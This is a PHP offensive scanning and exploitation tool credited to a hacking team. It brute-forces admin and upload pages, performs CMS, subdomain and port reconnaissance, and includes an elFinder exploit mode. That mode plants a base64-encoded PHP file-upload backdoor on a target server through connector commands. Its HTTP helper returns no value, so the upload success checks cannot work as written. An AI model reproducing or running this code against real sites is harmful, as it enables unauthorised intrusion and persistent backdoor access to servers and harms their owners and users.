#!/usr/bin/env php
<?php
include(__DIR__ . '/vendor/autoload.php');
if(strtolower(substr(PHP_OS, 0, 3)) == 'win') {
	$R  = "";
	$RR = "";
	$G  = "";
	$GG = "";
	$B  = "";
	$BB = "";
	$Y  = "";
	$YY = "";
	$X  = "";
	$ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:53.0) Gecko/20100101 Firefox/53.0";
} else {
	$R  = "\e[91m";
	$RR = "\e[91;7m";
	$G  = "\e[92m";
	$GG = "\e[92;7m";
	$B  = "\e[36m";
	$BB = "\e[36;7m";
	$Y  = "\e[93m";
	$YY = "\e[93;7m";
	$X  = "\e[0m";
	$ua = "Mozilla/5.0 (Linux; Android 5.1.1; Andromax A16C3H Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Mobile Safari/537.36";
	system("clear");
}
function ngirim($url, $isi) {
 global $ua;
 $ch = curl_init($url);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
 curl_setopt($ch, CURLOPT_USERAGENT, $ua);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_POST, 1);
 curl_setopt($ch, CURLOPT_POSTFIELDS, $isi);
 curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie');
 curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie');
 curl_exec($ch);
 curl_close($ch);
}
echo $Y.
" ___           __               __ 
/  _/___ _  _ _\ |___  _ __  | /  \ |
\_  \ . \ \/ / . / ._\| `_/ \_\\  //_/
/___/  _/\  /\___\___\|_|    .'/()\`.
    |_\  /_/                 \ \  / /";
echo $R."\n++++++++++++++++++++++++++++++++++++++";
echo $B."\nAuthor  : Cvar1984                   ".$R."+";
echo $B."\nGithub  : https://github.com/Cvar1984".$R."+";
echo $B."\nTeam    : BlackHole Security         ".$R."+";
echo $B."\nVersion : 0.6.2                      ".$R."+";
echo $B."\nDate    : 31-03-2018                 ".$R."+";
echo $R."\n++++++++++++++++++++++++++++++++++++++".$G."\n\n";
function_exists("curl_init") OR die($YY . "[!] cUrl Is Missing [!]".$X."\n");
if(!(isset($argv[1]) AND isset($argv[2]))) {
	echo $Y;
	echo "--admin,   -a\tSearch Admin Pages\n";
	echo "--upload,  -u\tSearch Upload Pages\n";
	echo "--cms,     -c\tCMS Scan\n";
	echo "--domain,  -d\tSubdomain Scan\n";
	echo "--nmap,    -n\tNmap Port Scan\n";
	echo "--exploit, -e\tExploit Elfinder\n";
	echo "--update,  -U\tUpdate Wordlist\n\n";
	echo "Example : ".$GG."php ".$argv[0]." http://example.com --admin".$X."\n";
} else {
	if(preg_match("/^https:/", $argv[1])):
		$argv[1]=str_replace("https://", "http://", $argv[1]);
		endif;
	if($argv[2] == "--upload" OR $argv[2] == "-u") {
		$list=explode("\n",file_get_contents("upload"));
	} elseif($argv[2] == "--admin" OR $argv[2] == "-a") {
		$list=explode("\n",file_get_contents("admin"));
	} elseif($argv[2] == "--update" OR $argv[2] == "-U" OR $argv[1] == "--update" OR $argv[1] == "-U") {
		echo $GG . "[*] Updating [*]" . $X . "\n\n";
		if(!function_exists('file_get_contents')) {
			die($RR . "Function Disabled" . $X . "\n");
		}
		$upload = file_get_contents('https://raw.githubusercontent.com/Cvar1984/Spyder/master/upload');
		$tulis  = fopen('upload', 'w+');
		fwrite($tulis, $upload);
		fclose($tulis);
		echo $GG . "[*] Uploader Wordlist Updated [*]\n\n";
		sleep(1);
		$admin = file_get_contents('https://raw.githubusercontent.com/Cvar1984/Spyder/master/admin');
		$tulis = fopen('admin', 'w+');
		fwrite($tulis, $admin);
		fclose($tulis);
		die($GG . "[*] Admin Wordlist Updated [*]" . $X . "\n");
	} elseif($argv[2] == "--domain" OR $argv[2] == "-d") {
		if(preg_match("/http:/",$argv[1])) {
			$argv[1]=str_replace("http://","",$argv[1]);
		} elseif(preg_match("/https:/",$argv[1])) {
			$argv[1]=str_replace("https://","",$argv[1]);
		}	
		$domain=file_get_contents("http://api.hackertarget.com/hostsearch/?q=".$argv[1]);
		$domain=str_replace(",","\n",$domain);
		if(!preg_match("/error/",$domain)) {
		echo $domain;
		$tulis=fopen("result.txt","a");
		fwrite($tulis,$domain);
		fclose($tulis);
		die($R . "=========================== Cvar1984 ))=====(@)>" . $X . "\n");
		} else {
			die($RR."[!] Subdomain Not Found [!]\n".$X);
		}
		} elseif($argv[2] == "--cms" OR $argv[2] == "-c") {
			$cms = new \DetectCMS\DetectCMS($argv[1]);
	if($cms->getResult()) {
	   die("Detected CMS  : ".$Y.$cms->getResult().$G."\n");
	} else {
	 die($RR."[!] CMS couldn't be detected [!]".$X.$G."\n");
	}
	}	
	elseif($argv[2] == "--exploit" OR $argv[2] == "-e") {
		if(!preg_match("/php/",$argv[1])) {
			die($RR."php $argv[0] http://example.com/path/php/connector.php -e".$X."\n");
		}
		$isi="PD9waHAgCmlmKCRfUE9TVCl7CmlmKEBjb3B5KCRfRklMRVNbImYiXVsidG1wX25hbWUiXSwkX0ZJTEVTWyJmIl1bIm5hbWUiXSkpewplY2hvIjxiPmJlcmhhc2lsPC9iPi0tPiIuJF9GSUxFU1siZiJdWyJuYW1lIl07Cn1lbHNlewplY2hvIjxiPmdhZ2FsIjsKfQp9CmVsc2V7CgllY2hvICI8Zm9ybSBtZXRob2Q9cG9zdCBlbmN0eXBlPW11bHRpcGFydC9mb3JtLWRhdGE+PGlucHV0IHR5cGU9ZmlsZSBuYW1lPWY+PGlucHV0IG5hbWU9diB0eXBlPXN1Ym1pdCBpZD12IHZhbHVlPXVwPjxicj4iOwp9Cgo/Pg==";
		$encode=base64_encode($isi);
		$isi=base64_decode($isi);
		$fp=fopen("x.php","w+");
		fputs($fp, $isi);
			echo $R."[!] Exploiting ".$argv[1]." [!]\n";
			echo $Y."[!] Uploading 1 [!]\n";
			$url= $argv[1]."?cmd=mkfile&name=x.php&target=l1_Lw";
			$url=file_get_contents($url);
			$post1=array(
			"cmd" => "put",
			"target" => "l1_".$encode,
			"content" => $isi,	
			);
			$post2 = array(
			"current" => "8ea8853cb93f2f9781e0bf6e857015ea",
			"upload[]" => "x.php",
			);
	$output= ngirim($argv[1], $post1);
	if(preg_match("/x.php/", $output)){
	echo $GG."[!] File Uploaded To ../../elfinder/files/x.php [!]".$X."\n\n";
	} else {
	echo $RR."[!] Upload Failed 1 [!]".$X."\n";
	}
	echo $Y."[!] Uploading 2 [!]".$X."\n";
	$upload=ngirim($argv[1]."?cmd=upload", $post2);
	if(preg_match("/x.php/", $upload)) {
		echo $YY."[!] File Uploaded To ../../elfinder/files/x.php [!]".$X."\n\n";
	} else {
		echo $RR."[!] Upload Failed 2 [!]".$X."\n";
	}
		die();
	} elseif($argv[2] == '--nmap' OR $argv[2] == '-n') {
		if(preg_match("/^http:/",$argv[1])) {
			$argv[1]=str_replace('http://','',$argv[1]);
		} elseif(preg_match("/^https:/",$argv[1])) {
			$argv[1]=str_replace('https://','',$argv[1]);
		}
		$result=file_get_contents("http://api.hackertarget.com/nmap/?q=".$argv[1]);
		$result=str_replace('\x20'," ",$result);
		$result=str_replace('\n',"\n",$result);
		$result=str_replace('\r',"\r",$result);
		die($result);
	} else {
		die($YY . "[!] Parameter False [!]" . $X . "\n");
	}
	$count = count($list);
	echo "String Loaded : ".$Y.$count.$G."\n";
	foreach($list as $list) {
		$url = $argv[1].'/'.$list;
		$ch  = curl_init($url);
		curl_setopt($ch, CURLOPT_USERAGENT, $ua);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
		curl_exec($ch);
		$header = curl_getinfo($ch, CURLINFO_HTTP_CODE);
		curl_close($ch);
		if(!($header == 404 OR $header == 0)) {
			$hdr= "
header : ".$header."
Url    : ".$url;
			$tulis = fopen("result.txt", "a");
			fwrite($tulis, $hdr);
			fclose($tulis);
			$header = $B.$header.$G;
		} else {
			$header = $R.$header.$G;
		}
		echo "Header : ".$header."\n";
		echo "Url    : ".$Y.$url.$G."\n";
	}
	die($R."=========================== Cvar1984 ))=====(@)>".$X."\n");
}